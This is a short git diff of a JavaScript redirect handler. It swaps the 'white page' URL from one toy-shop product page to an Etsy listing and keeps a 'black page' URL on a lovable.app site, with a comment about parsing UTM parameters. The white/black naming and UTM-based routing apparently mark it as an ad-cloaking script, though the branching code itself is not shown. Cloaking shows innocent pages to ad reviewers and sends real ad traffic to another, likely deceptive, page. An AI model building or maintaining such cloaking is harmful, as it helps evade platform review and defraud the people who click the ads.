@@ -1,6 +1,6 @@
 export default function handler(req, res) {
     // URLs to redirect
-    const whitePageURL = "https://www.littlethingz.be/nl/the-elf-on-the-shelf-spa-dag-set.html";
+    const whitePageURL = "https://www.etsy.com/listing/1735077626/teddy-bear-with-t-shirt?ls=a&ref=listing_page_ad_row-4&plkey=LT37b226b38aac76d2b863f8eb3efb705548739392%3A1735077626&listing_id=1735077626&listing_slug=teddy-bear-with-t-shirt";
     const blackPageURL = "https://luvcshap.lovable.app/";
   
     // Parse the UTM parameters from the request URL
@@ -26,3 +26,4 @@ export default function handler(req, res) {
     res.end();
 
   }
+
